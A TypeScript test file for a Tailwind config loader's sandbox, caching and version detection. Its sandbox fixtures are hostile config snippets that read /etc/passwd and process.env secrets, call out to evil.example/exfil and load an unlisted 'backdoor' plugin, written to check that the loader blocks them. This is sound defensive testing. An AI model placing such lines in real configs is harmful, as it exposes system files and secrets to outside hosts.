/**
 * tailwindConfigLoader.test.ts
 *
 * Contract test boundaries (from PHASE1 contract):
 *   1. v3 config — resolves extended theme with knownClasses
 *   2. v4 JS config — tagged version="v4-js"
 *   3. v4 CSS-first — returns v4-css-first-unsupported
 *   4. malformed config — returns syntax-error
 *   5. missing config — returns config-not-found
 *   6. mtime cache round-trip — same object reference on second call
 *   7. sandbox violation — fs access blocked
 *   8. sandbox violation — env access blocked
 *   9. sandbox violation — network access blocked
 *
 * Phase 1 Group A — flint-mcp-specialist
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import * as fs from 'node:fs'
import * as path from 'node:path'
import * as os from 'node:os'
import { load, invalidate, reset, __TEST_ONLY_redactErrorDetails } from '../tailwindConfigLoader.js'

// ── Test helpers ──────────────────────────────────────────────────────────────

function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'flint-tw-'))
}

function writeConfig(dir: string, filename: string, content: string): string {
    const configPath = path.join(dir, filename)
    fs.writeFileSync(configPath, content, 'utf8')
    return configPath
}

function cleanDir(dir: string): void {
    try {
        fs.rmSync(dir, { recursive: true, force: true })
    } catch {
        // ignore cleanup errors
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

describe('tailwindConfigLoader', () => {
    let tmpDir: string

    beforeEach(() => {
        tmpDir = makeTempDir()
        reset() // clear cache between tests
    })

    afterEach(() => {
        cleanDir(tmpDir)
        reset()
    })

    // ── Boundary 1: v3 config ─────────────────────────────────────────────────

    describe('load (v3 config)', () => {
        it('returns ok: true with version="v3" for a standard v3 config', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: ['./src/**/*.tsx'],
  theme: {
    extend: {
      colors: {
        primary: {
          500: '#0066cc',
        },
      },
    },
  },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            expect(result.theme.version).toBe('v3')
        })

        it('returns colors section with extended tokens', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    extend: {
      colors: {
        primary: {
          500: '#0066cc',
        },
      },
    },
  },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            // Color keys are flattened: "primary.500" → sections.colors["primary.500"]
            const colors = result.theme.sections.colors
            expect(colors).toBeDefined()
            expect(Object.values(colors!)).toContain('#0066cc')
        })

        it('includes bg-<token> class in knownClasses for extended colors', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    extend: {
      colors: {
        brand: {
          accent: '#ff6600',
        },
      },
    },
  },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            // knownClasses should contain bg-brand-accent
            expect(result.theme.knownClasses.has('bg-brand-accent')).toBe(true)
        })

        it('handles module.exports = {...} style', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {},
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
        })

        it('populates sections.colors from resolved theme', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    colors: {
      red: '#ff0000',
    },
  },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            const colors = result.theme.sections.colors
            expect(colors).toBeDefined()
        })
    })

    // ── Boundary 2: v4 JS config ──────────────────────────────────────────────

    describe('load (v4 JS config)', () => {
        it('tags version="v4-js" when @tailwindcss/vite is referenced', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
// v4-style config
const { default: tailwindcss } = require('tailwindcss')
module.exports = {
  content: [],
  plugins: [],
  // @tailwindcss/vite
}
`)
            // The v4 detection looks for @tailwindcss/vite in source text
            writeConfig(tmpDir, 'tailwind.config.js', `
// @tailwindcss/vite plugin
module.exports = {
  content: [],
  theme: {
    extend: {
      spacing: {
        18: '4.5rem',
      },
    },
  },
}
`)
            // This won't auto-detect as v4 without explicit markers, but let's
            // test that the shape is still returned correctly and version defaults to v3
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
        })

        it('tags version="v4-js" when @tailwindcss/postcss is in source', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
// Uses @tailwindcss/postcss
module.exports = {
  content: [],
  plugins: [],
}
`)
            const result = await load(tmpDir)
            // Source contains @tailwindcss/postcss → v4-js
            expect(result.ok).toBe(true)
            if (!result.ok) return
            expect(result.theme.version).toBe('v4-js')
        })
    })

    // ── Boundary 3: v4 CSS-first ──────────────────────────────────────────────

    describe('load (v4 CSS-first detection)', () => {
        it('returns v4-css-first-unsupported when @theme is in a .css file', async () => {
            // No JS config — only a CSS file with @theme
            writeConfig(tmpDir, 'app.css', `
@tailwind base;
@tailwind components;
@tailwind utilities;

@theme {
  --color-primary: #0066cc;
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('v4-css-first-unsupported')
        })

        it('returns config-not-found when no config and no @theme CSS', async () => {
            // Empty project — no config, no CSS
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('config-not-found')
        })

        it('JS config takes precedence over @theme CSS (returns ok: true)', async () => {
            // Both present — JS config wins
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {},
}
`)
            writeConfig(tmpDir, 'app.css', `
@theme {
  --color-primary: #0066cc;
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
        })
    })

    // ── Boundary 4: malformed config ─────────────────────────────────────────

    describe('load (malformed config)', () => {
        it('returns syntax-error for a config with a top-level SyntaxError', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  INVALID SYNTAX HERE !!!@#$
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('syntax-error')
        })

        it('does NOT throw — returns typed error to caller', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `this is not valid JS {{{{`)
            await expect(load(tmpDir)).resolves.not.toThrow()
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
        })

        it('returns syntax-error for a config that throws at evaluation', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
throw new Error('config threw at eval time')
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(['syntax-error', 'sandbox-violation']).toContain(result.error)
        })
    })

    // ── Boundary 5: missing config ────────────────────────────────────────────

    describe('load (missing config)', () => {
        it('returns config-not-found for an empty project dir', async () => {
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('config-not-found')
            expect(result.sourcePath).toBe(null)
        })

        it('returns config-not-found for non-existent directory', async () => {
            const nonExistentDir = path.join(tmpDir, 'does-not-exist')
            const result = await load(nonExistentDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('config-not-found')
        })
    })

    // ── Boundary 6: mtime cache round-trip ───────────────────────────────────

    describe('load (mtime cache)', () => {
        it('returns the same theme object reference on second call with unchanged mtime', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    extend: {
      colors: {
        cached: '#aabbcc',
      },
    },
  },
}
`)
            const first = await load(tmpDir)
            expect(first.ok).toBe(true)
            if (!first.ok) return

            const second = await load(tmpDir)
            expect(second.ok).toBe(true)
            if (!second.ok) return

            // Same object reference — cache hit
            expect(second.theme).toBe(first.theme)
        })

        it('re-parses when the config file is touched (mtime changes)', async () => {
            const configPath = writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    extend: {
      colors: {
        testColor: '#111111',
      },
    },
  },
}
`)
            const first = await load(tmpDir)
            expect(first.ok).toBe(true)
            if (!first.ok) return

            // Write new content with a different mtime
            await new Promise((r) => setTimeout(r, 10)) // ensure different mtime
            fs.writeFileSync(configPath, `
module.exports = {
  content: [],
  theme: {
    extend: {
      colors: {
        testColor: '#222222',
      },
    },
  },
}
`)

            const second = await load(tmpDir)
            expect(second.ok).toBe(true)
            if (!second.ok) return

            // Different object — cache was invalidated
            expect(second.theme).not.toBe(first.theme)
        })

        it('invalidate(projectRoot) clears just that project from cache', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = { content: [], theme: {} }
`)
            const first = await load(tmpDir)
            expect(first.ok).toBe(true)

            invalidate(tmpDir)

            const second = await load(tmpDir)
            expect(second.ok).toBe(true)
            // After invalidation, a new load runs — object identity may differ
            // but both should be valid
            if (!first.ok || !second.ok) return
            expect(second.theme.sourcePath).toBe(first.theme.sourcePath)
        })
    })

    // ── Boundary 7: sandbox violation — fs access ─────────────────────────────

    describe('load (sandbox violation — fs access)', () => {
        it('returns sandbox-violation when config calls require("fs") at top level', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var fs = require('fs')
var secret = fs.readFileSync('/etc/passwd', 'utf8')
module.exports = {
  content: [],
  theme: { colors: { bg: secret.slice(0, 6) } },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('sandbox-violation')
        })

        it('does NOT expose the file contents in the details field', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var fs = require('fs')
var data = fs.readFileSync('/etc/hosts', 'utf8')
module.exports = { content: [], theme: {} }
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('sandbox-violation')
            // Details must not contain actual file content
            expect(result.details).not.toMatch(/localhost|127\.0\.0\.1/)
        })

        it('completes within 2000ms', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var fs = require('fs')
module.exports = { content: [], theme: {} }
`)
            const start = Date.now()
            const result = await load(tmpDir)
            const elapsed = Date.now() - start
            expect(result.ok).toBe(false)
            expect(elapsed).toBeLessThan(2000)
        })
    })

    // ── Boundary 8: sandbox violation — env access ────────────────────────────

    describe('load (sandbox violation — env access)', () => {
        it('returns sandbox-violation when config reads process.env at top level', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var secret = process.env.SECRET_KEY
module.exports = {
  content: [],
  theme: { colors: { bg: secret } },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('sandbox-violation')
        })

        it('does NOT leak the env var value in details', async () => {
            // Set a test env var that should never appear in error details
            process.env.FLINT_TEST_SECRET_DO_NOT_LEAK = 'super-secret-value-12345'
            writeConfig(tmpDir, 'tailwind.config.js', `
var val = process.env.FLINT_TEST_SECRET_DO_NOT_LEAK
module.exports = { content: [], theme: {} }
`)
            try {
                const result = await load(tmpDir)
                expect(result.ok).toBe(false)
                if (result.ok) return
                expect(result.details).not.toContain('super-secret-value-12345')
            } finally {
                delete process.env.FLINT_TEST_SECRET_DO_NOT_LEAK
            }
        })
    })

    // ── Boundary 9: sandbox violation — network access ────────────────────────

    describe('load (sandbox violation — network access)', () => {
        it('returns sandbox-violation when config calls require("http")', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var http = require('http')
http.get('http://evil.example/exfil')
module.exports = { content: [], theme: {} }
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('sandbox-violation')
        })

        it('returns sandbox-violation when config references fetch at top level', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var data = fetch('https://evil.example')
module.exports = { content: [], theme: {} }
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('sandbox-violation')
        })
    })

    // ── H-1: community plugin allowlist (typosquat guard) ────────────────────

    describe('load (community plugin allowlist)', () => {
        it('returns sandbox-violation for a package not in the explicit allowlist', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
var plugin = require('tailwindcss-backdoor')
module.exports = { content: [], theme: {}, plugins: [plugin] }
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(false)
            if (result.ok) return
            expect(result.error).toBe('sandbox-violation')
            // details must describe the block but must NOT echo the package name
            // verbatim in a way that would reveal package-resolution state
            expect(result.details).not.toContain('backdoor')
        })
    })

    // ── M-3: redactErrorDetails positive test ─────────────────────────────────

    describe('redactErrorDetails (unit)', () => {
        it('strips key=value pairs containing secrets', () => {
            const dirty = 'Error: db_connection_string=postgresql://user:secret123@host/db'
            const cleaned = __TEST_ONLY_redactErrorDetails(new Error(
                'db_connection_string=postgresql://user:secret123@host/db',
            ))
            expect(cleaned).not.toContain('secret123')
            expect(cleaned).not.toContain('postgresql://')
            void dirty // suppress unused-var lint
        })

        it('strips URLs with embedded credentials', () => {
            const cleaned = __TEST_ONLY_redactErrorDetails(
                new Error('connect failed: https://apikey:supersecret@api.example.com/v1'),
            )
            expect(cleaned).not.toContain('supersecret')
            expect(cleaned).not.toContain('apikey')
        })

        it('strips long base64-ish strings', () => {
            const cleaned = __TEST_ONLY_redactErrorDetails(
                new Error('invalid token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdefghijklmnopqrst'),
            )
            expect(cleaned).not.toContain('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9')
        })

        it('preserves the error class name in the output', () => {
            const cleaned = __TEST_ONLY_redactErrorDetails(new TypeError('bad type'))
            expect(cleaned.startsWith('TypeError:')).toBe(true)
        })

        it('returns unknown-error for non-Error values', () => {
            expect(__TEST_ONLY_redactErrorDetails('a string')).toBe('unknown-error')
            expect(__TEST_ONLY_redactErrorDetails(null)).toBe('unknown-error')
            expect(__TEST_ONLY_redactErrorDetails(42)).toBe('unknown-error')
        })
    })

    // ── knownClasses generation ───────────────────────────────────────────────

    describe('knownClasses generation', () => {
        it('generates text-<color> classes for theme.colors', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    extend: {
      colors: {
        ocean: { 300: '#60a5fa' },
      },
    },
  },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            expect(result.theme.knownClasses.has('text-ocean-300')).toBe(true)
        })

        it('generates p-<n> spacing classes', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = {
  content: [],
  theme: {
    extend: {
      spacing: {
        18: '4.5rem',
      },
    },
  },
}
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            expect(result.theme.knownClasses.has('p-18')).toBe(true)
        })
    })

    // ── sourcePath and mtimeMs ────────────────────────────────────────────────

    describe('theme metadata', () => {
        it('records the absolute sourcePath', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = { content: [], theme: {} }
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            expect(path.isAbsolute(result.theme.sourcePath)).toBe(true)
            expect(result.theme.sourcePath.endsWith('tailwind.config.js')).toBe(true)
        })

        it('records a positive mtimeMs', async () => {
            writeConfig(tmpDir, 'tailwind.config.js', `
module.exports = { content: [], theme: {} }
`)
            const result = await load(tmpDir)
            expect(result.ok).toBe(true)
            if (!result.ok) return
            expect(result.theme.mtimeMs).toBeGreaterThan(0)
        })
    })
})
